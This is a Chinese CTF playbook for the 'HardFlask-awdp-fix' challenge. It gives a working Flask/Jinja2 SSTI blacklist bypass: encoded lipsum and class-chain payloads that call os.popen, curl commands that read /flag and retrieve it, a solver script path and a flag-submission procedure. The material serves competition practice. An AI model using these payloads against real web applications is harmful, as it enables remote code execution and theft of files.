# HardFlask-awdp-fix（决赛新题型 · AWDP · Web · 100 分）

原型为 DASCTF 2022.07 赋能赛 WEB1 HardFlask（Flask SSTI bypass + 盲注，原题 flag 文件 `/f1agggghere`）。
决赛 AWDP-fix 新题型：无附件、`remote_target` 单靶机 + flag 提交预算（50 次）。经典 AWDP 有 attack（打靶机拿
flag）/ fix（修补自己服务拿防御分）双形态；**本平台测试赛实现只有前者的判分面**（submit_flag 二值 verdict，
无 patch 上传 / SLA 检查入口）——题目名里的 `-fix` 指源码是被加固过的修复版（黑名单比原题更狠），仍可绕。
按「打」题处理即可。flag 为 dynamic 注入（`start.sh: echo $DASFLAG > /flag` 后 `export DASFLAG=not_flag`，
环境变量是陷阱，真值只在 `/flag`）。

**测试赛（2026-09-10）此题为平台坏题**：RCE 与 SSH 双通道读到 `/flag`，整串 / 内层全部 rejected；调度者查
管理面确认无预登记期望值，判定部署 / 平台不一致，全队止损（共烧 4 次提交，剩 46）。决赛若再现：可能已修复
（正常交 flag），可能仍是坏题（走下方 SOP 止损）。

## RCE 路径（本题核心资产，约 5 分钟）

一键脚本（TARGET 参数化，脚本自动完成探活 → RCE → 取回）：

```bash
python3 /opt/solver/knowledges/xihulunjian/challenges/HardFlask-awdp-fix/exp/solve.py "http://$THOST:$TPORT"
```

预期输出：

```
[*] target     : http://1.14.76.59:20805
[*] fingerprint: Age Test / Werkzeug/2.0.3 Python/3.8.20
[*] SSTI probe : alive
[*] RCE        : lipsum chain triggered
[+] FLAG       : DASCTF{688f238b08ac8b9086a54e9188d1f5c3}
[*] submit     : 688f238b08ac8b9086a54e9188d1f5c3  (备选整串 DASCTF{688f238b08ac8b9086a54e9188d1f5c3})
```

手动分步（脚本即此流程）：

1. 指纹。`curl -s $TARGET/` 返回 "Age Test" 页面；响应头 `Server: Werkzeug/2.0.3 Python/3.8.20`
   （requirements: Flask 1.1.1 / Jinja2 2.10.1）。
2. 漏洞点。`POST /` 字段 `nickname` → `render_template_string(nicknames[id] % p)`，黑名单子串过滤。
   响应模板从 6 条昵称随机取一（`Is %s 20 years old?` 等），**判定一律用子串 `'ok' in 响应`，勿做全匹配**。
3. 探活（`{{}}` 被禁，`{% %}` 语句块可用）：

   ```bash
   curl -s -d 'nickname={%if(1)%}ok{%endif%}' $TARGET/
   # 预期：响应含 "ok"（如 "ok is 21 years old."）
   ```

4. RCE payload（lipsum 链，attr 名与命令整体 `\uXXXX` 编码）。可读形式：

   ```
   {%if(lipsum|attr("__globals__")|attr("__getitem__")("__builtins__")|attr("__getitem__")("__import__")("os")|attr("popen")("cat /flag>/app/static/hfkbout"))%}ok{%endif%}
   ```

   实际发送（编码后，raw 文本不含任何黑名单子串——空格=`\u0020`、`flag`=`\u0066\u006c\u0061\u0067`）：

   ```
   {%if(lipsum|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f")("\u006f\u0073")|attr("\u0070\u006f\u0070\u0065\u006e")("\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u003e\u002f\u0061\u0070\u0070\u002f\u0073\u0074\u0061\u0074\u0069\u0063\u002f\u0068\u0066\u006b\u0062\u006f\u0075\u0074"))%}ok{%endif%}
   ```

   `POST` 后响应含 `ok`（popen 返回的文件对象为真值）即 RCE 成立；命令本身无回显（if 块是盲的），
   靠第 5 步取回。exfil 写 `/app/static/`（`/app` 0777、app 以 uid 1000 ctf 运行、Flask 直接伺服该目录）。
5. 取回 flag：`curl -s $TARGET/static/hfkbout` → `DASCTF{...}`。
6. 响应标记速查：`Hacker! restricted characters!` = 命中黑名单；`Exception` = Jinja 表达式出错；
   正常昵称文本 = 渲染成功。
7. 备用链（lipsum 失效时）：class 链
   `""|attr("__class__")|attr("__bases__")|attr("__getitem__")(0)|attr("__subclasses__")()|attr("__getitem__")(IDX)|attr("__init__")|attr("__globals__")|attr("__getitem__")("popen")`
   —— IDX 环境相关（测试轮实测 **132**，原题 WP 为 133），先用真值探针扫 0..400 找含 `popen` 的索引再打。
8. 坑位清单（全部来自测试赛实踩）：
   - raw payload 任意位置不得出现黑名单子串——包括 exfil 文件名（`x78102834out` 因字母 x 被拒过一次）；
     `\u` 十六进制只含 0-9a-f，天然无 `g`/`x`。
   - Python 侧构造 payload 禁用 `%` 格式化（`{%if` 中的 `%i` 会让 Python 报 `TypeError`），用字符串拼接。
   - 脚本里含 `\uXXXX` 字面量的 docstring 必须 `r"""`，否则 SyntaxError。
   - 链尾**不要**接 `|attr("read")()` 再包 if：命令 stdout 重定向后 `read()` 返回空串为假，响应无 `ok`
     但命令其实已执行——成功判据只看 exfil 文件。
   - `DASFLAG` 环境变量 = `not_flag`（诱饵），真值只在 `/flag`；app 进程其余 env 也无 flag。
   - AWDP 每队有 SSH 管理通道（用户 `ctf`，端口 / 口令随实例轮换，以赛事面为准），`cat /flag` 可交叉验证；
     HTTP 与 SSH 是同一容器（SSH 写 `/app/static/x` 后 HTTP 可取）。
   - 全盘只有 `/flag` 一个 flag；无 privesc（CapEff=0、seccomp、`/root` 0700、无 sudo）——别找第二个。

## 提交 SOP（读到 flag 之后 / 坏题处置）

前置校验：RCE 与 SSH 双通道读 `/flag` 值一致，`od -c /flag` 确认无隐藏字符（测试轮值
`DASCTF{688f238b08ac8b9086a54e9188d1f5c3}\n`，md5 `3b1ff617b896d0aa061d29b64d267fdf`）。

1. **第 1 次提交：`{}` 内裸值**（本平台惯例 accepted 值即裸 32hex，见 llfsrr / upup_exec 复盘）。
2. 若 rejected：**第 2 次提交 `DASCTF{}` 整串**。到此为止，不猜第三种格式（verdict 是二值 rejected，
   无任何格式提示，用提交探测格式纯属烧预算）。
3. 第二次仍 rejected → **立即停止提交**，升级调度者裁决，随附：双通道 flag 值、两次 verdict 原文、
   请求调度查管理面 `challenges.get().flags` 是否有预登记期望值。调度确认无期望值 / 判定坏题后，全队停止
   提交本题，预算留给其它题。
4. 禁止事项：不提交网络检索来的「原题 flag」（测试赛把官方 WP 的 `e4d78c6a...` 整串 / 内层各交一次，
   白烧 2 次）；不重复提交同值；不交 md5 / 大小写变体等花式格式。

测试赛实测证据（全程 4 次提交止损，预算 50 → 剩 46）：

| # | 提交值 | 来源 | verdict |
|---|---|---|---|
| 1 | `DASCTF{688f238b08ac8b9086a54e9188d1f5c3}` | 靶机 /flag 整串 | rejected |
| 2 | `688f238b08ac8b9086a54e9188d1f5c3` | /flag 内层裸值 | rejected |
| 3 | `DASCTF{e4d78c6aef20ad9e522f2ab8afa8c2b7}` | 原题官方 WP 截图 OCR 整串 | rejected |
| 4 | `e4d78c6aef20ad9e522f2ab8afa8c2b7` | 同上内层 | rejected |

verdict 原文形态：`Flag submission verdict: rejected — 提交flag错误，请重新提交（当前还有N次提交机会）`。
管理面查证（调度者 DM 原文要点）：`description='说出你的名字，我可以知道你的年龄。'`；`attachments=[]`；
`points=100`；`remote_id='11023'`；`remote_target=true`；`targets=[{name:'HardFlask-awdp-fix',
services:[]}]`；flags 字段仅上述 4 条 rejected，**无预登记期望值**；调度侧不暴露 remote 期望 flag。
终判：容器 `/flag` 与平台登记值不一致 ⇒ 部署 / 平台不一致坏题。

## 决赛备忘

- 决策树：先跑 RCE（≤5 分钟）→ 读值 → 交裸值 → **accepted = 平台已修复，正常收工**；
  两拒 = 仍是坏题 → 走 SOP 第 3 步止损。
- 若 `/flag` 值 ≠ 测试轮 `688f...`（md5 对不上），说明平台重新注入过 flag——大概率已修复，按正常题流程交。
- 时间盒：RCE 路径 5 分钟内完成（一键脚本）；SOP 止损后本题为零投入，等待调度申诉结果。
- 测试轮靶机 `1.14.76.59`（HTTP / SSH 端口与 SSH 口令随实例轮换，以赛事面 / `$THOST:$TPORT` 为准）；
  容器内仅 5000（app，uid 1000）与 22（sshd）两个监听。
